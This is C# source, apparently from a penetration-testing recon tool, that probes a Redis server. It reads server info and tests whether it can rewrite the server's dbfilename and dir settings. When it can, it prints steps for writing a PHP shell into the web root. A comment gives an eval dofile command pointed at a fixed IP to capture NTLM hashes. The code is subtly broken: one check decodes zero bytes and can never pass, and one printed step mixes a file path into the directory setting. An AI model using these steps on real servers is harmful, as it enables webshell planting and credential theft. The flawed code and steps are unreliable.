using Pastel;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;

namespace Reecon
{
    class Redis
    {
        public static string GetInfo(string ip, int port)
        {
            /* Redis Command Primer!
             * 1.) Find the DB -> info (Look at "Keyspace") - Eg: db0:keys=5,expires=0,avg_ttl=0 <--- db0
             * 2.) SELECT 0
             * 3.) KEYS *
             * 4.) GET "keyName"
             * --> WRONGTYPE Operation against a key holding the wrong kind of value
             * 4.a) LRANGE "keyName" 0 500
             */

            bool canSetDB = false;
            bool canSetPath = false;
            string returnText = "";
            Byte[] buffer = new Byte[5000];
            using (Socket redisSocket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
            {
                // Doing multiple requests with lots of data, so give it some time  
                redisSocket.ReceiveTimeout = 10000;
                redisSocket.SendTimeout = 5000;
                try
                {
                    redisSocket.Connect(ip, port); // Error if an invalid IP
                    byte[] cmdBytes = Encoding.ASCII.GetBytes(("INFO" + Environment.NewLine).ToCharArray());
                    redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                    // Get basic info
                    int bytes = 0;
                    buffer = General.ReceiveSocketData(redisSocket);
                    string redisText = Encoding.ASCII.GetString(buffer);
                    if (redisText.StartsWith("-NOAUTH Authentication"))
                    {
                        returnText = "- Redis Authentication required" + Environment.NewLine;
                        returnText += $"-- If you get creds: redis-cli -h {ip} -a passHere" + Environment.NewLine;
                    }
                    else
                    {
                        // We have access!
                        redisText = redisText.Trim();
                        List<string> redisLines = redisText.Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                        string redisVersion = redisLines.First(x => x.StartsWith("redis_version:"));
                        returnText += "- " + redisVersion;
                        string os = redisLines.First(x => x.StartsWith("os:"));
                        returnText += Environment.NewLine + "- " + os;
                        string osBits = redisLines.First(x => x.StartsWith("arch_bits:"));
                        returnText += Environment.NewLine + "- " + osBits;
                        string exeLocation = redisLines.FirstOrDefault(x => x.StartsWith("executable:"));
                        if (exeLocation != null)
                        {
                            returnText += Environment.NewLine + "- " + exeLocation;
                        }
                        string configLocation = redisLines.First(x => x.StartsWith("config_file:"));
                        returnText += Environment.NewLine + "- " + configLocation;
                        string connectedClients = redisLines.First(x => x.StartsWith("connected_clients:"));
                        returnText += Environment.NewLine + "- " + connectedClients;
                        System.Threading.Thread.Sleep(1000);
                        // Get dbfilenme
                        cmdBytes = Encoding.ASCII.GetBytes(("CONFIG GET dbfilename" + Environment.NewLine).ToCharArray());
                        redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                        buffer = General.ReceiveSocketData(redisSocket);
                        redisText = Encoding.ASCII.GetString(buffer);
                        redisLines = redisText.Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                        string dbFilename = "";
                        if (redisLines.Count == 6)
                        {
                            dbFilename = redisLines[4];
                            returnText += Environment.NewLine + "-- CONFIG GET dbfilename: " + dbFilename;
                        }
                        else
                        {
                            returnText += Environment.NewLine + "-- Error: Cannot get dbfilename - Count is: " + redisLines.Count + " (Expecting 6)";
                            returnText += Environment.NewLine + "--- Try manually - Connect to service, run: CONFIG GET dbfilename";
                        }

                        // Can we set dbfilename
                        if (dbFilename != "")
                        {
                            cmdBytes = Encoding.ASCII.GetBytes(("CONFIG SET dbfilename woof" + Environment.NewLine).ToCharArray());
                            redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                            buffer = General.ReceiveSocketData(redisSocket);
                            redisText = Encoding.ASCII.GetString(buffer, 0, bytes);
                            redisLines = redisText.Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                            if (redisLines.Count == 2 && redisLines[0].Contains("+OK"))
                            {
                                canSetDB = true;
                                returnText += Environment.NewLine + "--- " + "Able to CONFIG SET dbfilename value!".Pastel(Color.Orange);
                            }
                            // Reset it back to what it was
                            cmdBytes = Encoding.ASCII.GetBytes(("CONFIG SET dbfilename " + dbFilename + Environment.NewLine).ToCharArray());
                            redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                            bytes = redisSocket.Receive(buffer, buffer.Length, 0);
                        }

                        // Get dir
                        cmdBytes = Encoding.ASCII.GetBytes(("CONFIG GET dir" + Environment.NewLine).ToCharArray());
                        redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                        buffer = General.ReceiveSocketData(redisSocket);
                        redisText = Encoding.ASCII.GetString(buffer);
                        redisLines = redisText.Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                        string dirPath = "";
                        if (redisLines.Count == 6)
                        {
                            dirPath = redisLines[4];
                            returnText += Environment.NewLine + "-- CONFIG GET dir: " + redisLines[4];
                        }
                        else
                        {
                            Console.WriteLine("Error: Cannot get dir - Count is: " + redisLines.Count);
                        }

                        // Can we set dir
                        if (dirPath != "")
                        {
                            cmdBytes = Encoding.ASCII.GetBytes(("CONFIG SET dir /var/" + Environment.NewLine).ToCharArray());
                            redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                            buffer = General.ReceiveSocketData(redisSocket);
                            redisText = Encoding.ASCII.GetString(buffer);
                            redisLines = redisText.Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                            if (redisLines.Count == 2 && redisLines[0].Contains("+OK"))
                            {
                                canSetPath = true;
                                returnText += Environment.NewLine + "--- " + "Able to CONFIG SET dir value!".Pastel(Color.Orange);
                            }
                            // Reset it back to what it was
                            cmdBytes = Encoding.ASCII.GetBytes(("CONFIG SET dir " + dirPath + Environment.NewLine).ToCharArray());
                            redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
                            // (bytes, buffer) = General.ReceiveData(redisSocket, buffer);
                        }

                        if (canSetDB && canSetPath)
                        {
                            returnText += Environment.NewLine + "--- " + "Exploit Possible".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "----------------".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "1.) Connect with redis-cli".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "2.) CONFIG SET dbfilename PathOfFileYouCanView.php".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "3.) CONFIG SET dir /var/www/html/shell.php".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "4.) SET test \"SomeValueYouWant\"".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "5.) Save".Pastel(Color.Orange);
                            returnText += Environment.NewLine + "--- " + "6.) Browse to file location on server to see your custom value".Pastel(Color.Orange);
                        }
                    }
                    // eval "dofile('//10.8.26.200/test')" 0 - Get Responder hash

                }
                catch (Exception ex)
                {
                    returnText += "- Error - Cannot pull Redis Text: " + ex.Message;
                }
            }
            return returnText;
        }
    }
}
